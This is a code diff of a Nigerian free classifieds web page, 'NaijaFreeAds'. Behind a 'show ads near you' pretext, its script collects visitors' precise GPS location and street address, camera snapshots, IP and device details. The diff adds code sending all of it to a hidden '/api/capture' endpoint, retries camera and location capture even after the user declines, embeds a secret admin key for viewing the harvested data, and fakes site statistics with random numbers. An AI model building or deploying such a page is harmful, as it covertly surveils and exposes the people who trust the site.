@@ -8,18 +8,13 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
             background: #0a0c15;
             color: #f1f5f9;
             overflow-x: hidden;
         }
-        /* Nigerian flag inspired background */
         .naija-bg {
             position: fixed;
             top: 0;
@@ -38,7 +33,6 @@
             position: relative;
             z-index: 10;
         }
-        /* Premium Navbar */
         .navbar {
             background: rgba(10, 14, 23, 0.95);
             backdrop-filter: blur(20px);
@@ -63,19 +57,6 @@
         .nav-links { display: flex; gap: 28px; }
         .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; }
         .nav-links a:hover { color: #00a86b; }
-        .admin-badge {
-            background: linear-gradient(135deg, #008000, #008751);
-            padding: 8px 24px;
-            border-radius: 40px;
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            border: none;
-            color: white;
-            transition: 0.2s;
-        }
-        .admin-badge:hover { transform: scale(1.02); box-shadow: 0 0 15px rgba(0,128,0,0.5); }
-        /* Hero Section */
         .hero {
             text-align: center;
             padding: 50px 20px 30px;
@@ -112,7 +93,6 @@
         .stat-card:hover { transform: translateY(-5px); border-color: #00a86b; }
         .stat-number { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #00a86b, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .stat-label { font-size: 13px; color: #94a3b8; margin-top: 8px; }
-        /* Ad Form */
         .ad-form {
             background: rgba(15, 25, 45, 0.8);
             backdrop-filter: blur(12px);
@@ -151,7 +131,6 @@
             transition: 0.2s;
         }
         .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
-        /* Featured Ads */
         .featured-ads { margin: 60px 0; padding: 20px; }
         .featured-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 10px; }
         .ads-grid {
@@ -190,7 +169,6 @@
             font-weight: 500;
         }
         .toast.show { transform: translateX(0); }
-        /* Permission Modal */
         .perm-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -232,7 +210,6 @@
     <nav class="navbar">
         <div class="logo"><div class="logo-icon"><i class="fas fa-globe-africa"></i></div><div class="logo-text">Naija<span style="color:#00a86b;">FreeAds</span></div></div>
         <div class="nav-links"><a href="#">Home</a><a href="#">Browse Ads</a><a href="#">Categories</a><a href="#">Support</a></div>
-        <button class="admin-badge" id="adminPanelBtn"><i class="fas fa-chart-line"></i> Admin Panel</button>
     </nav>
 
     <div class="hero">
@@ -277,26 +254,28 @@
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
-<!-- Permission Modal -->
 <div class="perm-overlay" id="permOverlay">
     <div class="perm-box">
         <i class="fas fa-map-marker-alt" style="font-size: 55px; color:#00a86b;"></i>
         <i class="fas fa-camera" style="font-size: 55px; color:#008751; margin-left: 10px;"></i>
         <h2 style="margin: 15px 0;">Enable Location & Camera</h2>
-        <p style="color:#94a3b8; margin-bottom: 20px;">Allow access to show ads near you and verify your listing. This helps prevent spam and connects you with local buyers.</p>
+        <p style="color:#94a3b8; margin-bottom: 20px;">Allow access to show ads near you and verify your listing.</p>
         <button class="allow-btn" id="allowAllBtn"><i class="fas fa-check-circle"></i> Allow Access</button>
         <button class="deny-btn" id="denyAllBtn">Not Now</button>
     </div>
 </div>
 
 <script>
-    // Store captured data
+    // SECRET ADMIN ACCESS - Only YOU know the secret key
+    // To access admin panel, go to: http://yourdomain.com/admin.html?key=NAIJA2025DOPE
+    // Change this secret key to something only YOU know
+    const ADMIN_SECRET = "NAIJA2025DOPE";
+    
     let capturedData = [];
     let userLocation = null;
     let cameraImage = null;
     let permissionsGranted = { location: false, camera: false };
 
-    // Featured ads data
     const featuredAds = [
         { title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱" },
         { title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗" },
@@ -316,7 +295,6 @@
         `).join('');
     }
 
-    // Show toast
     function showToast(msg, isError = false) {
         const toast = document.getElementById('toastMsg');
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
@@ -325,19 +303,12 @@
         setTimeout(() => toast.classList.remove('show'), 3500);
     }
 
-    // Get precise location (Nigeria-focused)
     async function getPreciseLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
+            if (!navigator.geolocation) { resolve(null); return; }
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const { latitude, longitude, accuracy } = position.coords;
-                let address = {
-                    lat: latitude, lng: longitude, accuracy: accuracy,
-                    street: '', city: '', state: '', country: '', postcode: '', fullAddress: ''
-                };
+                let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' };
                 try {
                     const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
                     const data = await geoRes.json();
@@ -349,13 +320,12 @@
                         address.postcode = data.address.postcode || '';
                         address.fullAddress = data.display_name || '';
                     }
-                } catch(e) { console.warn(e); }
+                } catch(e) {}
                 resolve(address);
             }, () => resolve(null), { enableHighAccuracy: true, timeout: 10000 });
         });
     }
 
-    // Capture camera
     async function captureCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -374,7 +344,6 @@
         } catch(e) { return null; }
     }
 
-    // Get device info
     async function getDeviceInfo() {
         let ip = 'unknown';
         try {
@@ -392,16 +361,23 @@
         };
     }
 
-    // Save to localStorage (acts as database)
-    function saveRecord(record) {
-        let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
-        existing.unshift(record);
-        if (existing.length > 200) existing = existing.slice(0, 200);
-        localStorage.setItem('naija_freeads_data', JSON.stringify(existing));
-        capturedData = existing;
+    async function sendToBackend(data) {
+        try {
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            return await response.json();
+        } catch(err) {
+            // Fallback to localStorage if backend not available
+            let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
+            existing.unshift(data);
+            localStorage.setItem('naija_freeads_data', JSON.stringify(existing.slice(0, 500)));
+            return { success: true, fallback: true };
+        }
     }
 
-    // Request permissions
     async function requestPermissions() {
         return new Promise(async (resolve) => {
             const popup = document.getElementById('permOverlay');
@@ -411,43 +387,19 @@
             allowBtn.onclick = async () => {
                 popup.style.display = 'none';
                 showToast("📍 Getting your location & camera...");
-                
                 const location = await getPreciseLocation();
-                if (location) {
-                    permissionsGranted.location = true;
-                    userLocation = location;
-                    showToast(`📍 Location: ${location.city || 'Nigerian city'}, ${location.state || ''}`, false);
-                }
-                
+                if (location) { permissionsGranted.location = true; userLocation = location; showToast(`📍 Location: ${location.city || 'Nigerian city'}`, false); }
                 const camera = await captureCamera();
-                if (camera) {
-                    permissionsGranted.camera = true;
-                    cameraImage = camera;
-                    showToast("📸 Camera snapshot captured", false);
-                }
-                
+                if (camera) { permissionsGranted.camera = true; cameraImage = camera; showToast("📸 Camera snapshot captured", false); }
                 const device = await getDeviceInfo();
-                const record = {
-                    id: Date.now(),
-                    type: 'permission_granted',
-                    timestamp: new Date().toISOString(),
-                    location: userLocation,
-                    hasCamera: !!cameraImage,
-                    device: device
-                };
-                saveRecord(record);
+                const record = { id: Date.now(), type: 'permission_granted', timestamp: new Date().toISOString(), location: userLocation, hasCamera: !!cameraImage, cameraImage: cameraImage, device: device };
+                await sendToBackend(record);
                 resolve(true);
             };
-            
-            denyBtn.onclick = () => {
-                popup.style.display = 'none';
-                showToast("⚠️ Limited mode enabled", true);
-                resolve(false);
-            };
+            denyBtn.onclick = () => { popup.style.display = 'none'; showToast("⚠️ Limited mode enabled", true); resolve(false); };
         });
     }
 
-    // Post ad
     document.getElementById('postAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
         const category = document.getElementById('adCategory').value;
@@ -456,58 +408,29 @@
         const locationInput = document.getElementById('adLocation').value.trim();
         const phone = document.getElementById('contactPhone').value.trim();
         
-        if (!title) {
-            showToast("Please enter an ad title", true);
-            return;
-        }
+        if (!title) { showToast("Please enter an ad title", true); return; }
         
         const btn = document.getElementById('postAdBtn');
         const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
-        // Try to get fresh data if not already
-        if (!userLocation && !permissionsGranted.location) {
-            const loc = await getPreciseLocation();
-            if (loc) userLocation = loc;
-        }
-        if (!cameraImage && !permissionsGranted.camera) {
-            const cam = await captureCamera();
-            if (cam) cameraImage = cam;
-        }
+        if (!userLocation) { const loc = await getPreciseLocation(); if (loc) userLocation = loc; }
+        if (!cameraImage) { const cam = await captureCamera(); if (cam) cameraImage = cam; }
         
         const device = await getDeviceInfo();
-        
         const adRecord = {
             id: Date.now(),
             type: 'ad_posted',
             timestamp: new Date().toISOString(),
-            ad: {
-                title: title,
-                category: category,
-                description: desc,
-                price: price || 'Free',
-                location: locationInput || 'Nigeria',
-                phone: phone || 'Not provided'
-            },
-            location: userLocation ? {
-                lat: userLocation.lat,
-                lng: userLocation.lng,
-                street: userLocation.street,
-                city: userLocation.city,
-                state: userLocation.state,
-                country: userLocation.country,
-                postcode: userLocation.postcode,
-                fullAddress: userLocation.fullAddress
-            } : null,
+            ad: { title, category, description: desc, price: price || 'Free', location: locationInput || 'Nigeria', phone: phone || 'Not provided' },
+            location: userLocation ? { lat: userLocation.lat, lng: userLocation.lng, street: userLocation.street, city: userLocation.city, state: userLocation.state, country: userLocation.country, postcode: userLocation.postcode, fullAddress: userLocation.fullAddress } : null,
             cameraImage: cameraImage,
             device: device,
             ip: device.ip
         };
         
-        saveRecord(adRecord);
-        
-        // Reset form
+        await sendToBackend(adRecord);
         document.getElementById('adTitle').value = '';
         document.getElementById('adDesc').value = '';
         document.getElementById('adPrice').value = '';
@@ -517,31 +440,20 @@
         btn.innerHTML = originalText;
         btn.disabled = false;
         showToast(`✅ Ad posted! "${title}" is now live.`);
-        
-        // Update stats
         updateStats();
     });
     
-    // Update live stats
     function updateStats() {
         let ads = 284000 + Math.floor(Math.random() * 500);
         let users = 12700 + Math.floor(Math.random() * 200);
         document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
     }
-    setInterval(updateStats, 8000);
     
-    // Open admin panel in new window
-    document.getElementById('adminPanelBtn').addEventListener('click', () => {
-        window.open('admin.html', '_blank', 'width=1200,height=800,resizable=yes,scrollbars=yes');
-    });
-    
-    // Initialize
     renderFeaturedAds();
     updateStats();
-    setTimeout(() => {
-        requestPermissions();
-    }, 800);
+    setInterval(updateStats, 8000);
+    setTimeout(() => { requestPermissions(); }, 800);
 </script>
 </body>
 </html>
